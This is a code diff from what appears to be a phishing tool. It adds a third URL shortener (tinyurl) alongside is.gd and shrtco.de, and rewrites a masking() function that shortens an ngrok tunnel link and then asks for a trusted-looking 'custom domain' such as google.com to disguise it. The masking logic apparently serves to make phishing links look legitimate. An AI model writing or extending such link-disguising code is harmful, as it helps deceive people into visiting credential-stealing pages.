@@ -933,6 +933,19 @@ def url_manager(url, tunneler):
     sleep(0.5)
 
 def shortener1(url):
+    website = "https://is.gd/create.php?format=simple&url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
+
+def shortener2(url):
     website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
     internet()
     try:
@@ -946,8 +959,8 @@ def shortener1(url):
             return json_resp["result"]["full_short_link"]
     return ""
 
-def shortener2(url):
-    website = "https://is.gd/create.php?format=simple&url="+url.strip()
+def shortener3(url):
+    website = "https://tinyurl.com/api-create.php?url="+url.strip()
     internet()
     try:
         res = get(website).text
@@ -1011,19 +1024,18 @@ def about():
 # Optional function for ngrok url masking
 def masking(url):
     cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
-    if cust=="":
+    if cust in [ "", "n", "N", "no" ]:
         return
-    shortened1 = shortener1(url)
-    if shortened1 != "":
-        shortened = shortened1
-    else:
-        shortened2 = shortener2(url)
-        shortened = shortened2
-    if shortened != "":
-        short = shortened.replace("https://", "")
+    if (shortened:=shortener1(url)) != "":
+        pass
+    elif (shortened:=shortener2(url)) != "":
+        pass
+    elif (shortened:=shortener3(url)) != "":
+        pass
     else:
         sprint(f"{error}Service not available!")
         waiter()
+    short = shortened.replace("https://", "")
     # Remove slash and spaces from inputs
     domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
     if domain == "":
